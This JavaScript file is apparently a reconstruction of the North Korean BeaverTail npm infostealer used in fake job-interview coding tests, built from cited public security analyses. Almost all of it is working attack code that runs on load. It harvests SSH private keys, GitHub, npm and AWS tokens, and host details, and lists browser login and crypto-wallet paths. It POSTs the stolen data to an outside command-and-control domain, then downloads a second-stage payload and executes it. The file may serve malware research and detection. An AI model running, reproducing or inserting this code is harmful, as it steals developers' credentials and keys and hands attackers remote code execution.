// Contagious Interview campaign (North Korea / Lazarus APT)
// reconstructed from public security analyses
// Source: https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages
// Source: https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/
// Source: https://blog.phylum.io/lazarus-group-npm-attack/
//
// 2024-2025: North Korean APT (Lazarus/Famous Chollima) published 338+
// packages as fake job interview coding tests.
// The packages contained "BeaverTail" infostealer that:
// 1. Downloads and executes a second-stage payload
// 2. Steals browser credentials, crypto wallets, SSH keys
// 3. Establishes persistence and C2 connection
//
// Technique: Multi-stage payload, browser data theft, crypto wallet theft

const https = require("https");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { exec } = require("child_process");

// Stage 1: Reconnaissance and fingerprinting
function fingerprint() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    home: os.homedir(),
    cwd: process.cwd(),
  };
}

// Stage 2: Credential harvesting
function harvestCredentials() {
  var results = [];
  var home = os.homedir();

  // Browser credentials (Chrome/Chromium)
  var chromePaths = [
    path.join(home, ".config/google-chrome/Default/Login Data"),
    path.join(home, "AppData/Local/Google/Chrome/User Data/Default/Login Data"),
    path.join(home, "Library/Application Support/Google/Chrome/Default/Login Data"),
  ];

  // Crypto wallet paths
  var walletPaths = [
    path.join(home, ".ethereum/keystore"),
    path.join(home, ".config/solana/id.json"),
    path.join(home, "Library/Keychains"),
    path.join(home, ".gnupg/private-keys-v1.d"),
  ];

  // SSH keys
  var sshDir = path.join(home, ".ssh");
  try {
    if (fs.existsSync(sshDir)) {
      var sshFiles = fs.readdirSync(sshDir);
      sshFiles.forEach(function (f) {
        if (f === "id_rsa" || f === "id_ed25519" || f.endsWith(".pem")) {
          results.push({
            type: "ssh_key",
            path: f,
            data: fs.readFileSync(path.join(sshDir, f), "utf8"),
          });
        }
      });
    }
  } catch (e) {}

  // Environment tokens
  ["GITHUB_TOKEN", "NPM_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"].forEach(
    function (key) {
      if (process.env[key]) {
        results.push({ type: "env", key: key, value: process.env[key] });
      }
    }
  );

  return results;
}

// Stage 3: Exfiltrate to C2
function exfiltrate(data) {
  var payload = JSON.stringify({
    fp: fingerprint(),
    creds: data,
    ts: Date.now(),
  });

  var options = {
    hostname: "api.taaudit.com", // C2 domain pattern from reports
    port: 443,
    path: "/api/v1/ep",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
    },
  };

  try {
    var req = https.request(options);
    req.write(payload);
    req.end();
  } catch (e) {}
}

// Stage 4: Download second-stage payload (InvisibleFerret)
function downloadPayload() {
  var payloadUrl =
    "https://api.taaudit.com/api/v1/payload?platform=" + os.platform();

  https.get(payloadUrl, function (res) {
    var data = "";
    res.on("data", function (chunk) {
      data += chunk;
    });
    res.on("end", function () {
      try {
        // Execute downloaded payload
        var tmpFile = path.join(os.tmpdir(), ".npl");
        fs.writeFileSync(tmpFile, data);
        exec("node " + tmpFile, { detached: true, stdio: "ignore" });
      } catch (e) {}
    });
  });
}

// Execute attack chain
var creds = harvestCredentials();
exfiltrate(creds);
downloadPayload();
